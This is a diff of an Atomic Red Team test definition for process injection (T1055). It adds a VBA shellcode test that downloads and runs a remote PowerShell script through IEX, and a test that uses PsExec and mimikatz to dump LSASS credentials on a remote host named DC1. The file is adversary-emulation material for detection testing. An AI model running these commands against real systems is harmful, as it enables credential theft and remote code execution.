@@ -1,36 +1,80 @@
 attack_technique: T1055
 display_name: Process Injection
 atomic_tests:
-- name: Process Injection via mavinject.exe
-  auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
+- name: Shellcode execution via VBA
+  auto_generated_guid: 1c91e740-1729-4329-b779-feba6e71d048
   description: |
-    Windows 10 Utility To Inject DLLS.
+    This module injects shellcode into a newly created process and executes. By default the shellcode is created,
+    with Metasploit, for use on x86-64 Windows 10 machines.
 
-    Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
-    With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
+    Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office
+    is required.
   supported_platforms:
   - windows
-  input_arguments:
-    process_id:
-      description: PID of input_arguments
-      type: Integer
-      default: (Start-Process notepad -PassThru).id
-    dll_payload:
-      description: DLL to Inject
-      type: Path
-      default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      Utility to inject must exist on disk at specified location (#{dll_payload})
+      The 64-bit version of Microsoft Office must be installed
     prereq_command: |
-      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+      try {
+        $wdApp = New-Object -COMObject "Word.Application"
+        $path = $wdApp.Path
+        Stop-Process -Name "winword"
+        if ($path.contains("(x86)")) { exit 1 } else { exit 0 }
+      } catch { exit 1 }
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
+      Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
   executor:
     command: |
-      $mypid = #{process_id}
-      mavinject $mypid /INJECTRUNNING #{dll_payload}
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
     name: powershell
-    elevation_required: true
+- name: Remote Process Injection in LSASS via mimikatz
+  auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
+  description: |
+    Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
+    It must be executed in the context of a user who is privileged on remote `machine`.
+
+    The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
+  supported_platforms:
+  - windows
+  input_arguments:
+    machine:
+      description: machine to target (via psexec)
+      type: string
+      default: DC1
+    mimikatz_path:
+      description: Mimikatz windows executable
+      type: path
+      default: '%tmp%\mimikatz\x64\mimikatz.exe'
+    psexec_path:
+      description: Path to PsExec
+      type: string
+      default: C:\PSTools\PsExec.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
+    prereq_command: |
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+      Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+      New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+      Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+  - description: |
+      PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})
+    prereq_command: |
+      if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+      New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+  executor:
+    command: |
+      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
+    name: command_prompt
+    elevation_required: false # locally not, but remotely on target machine then yes
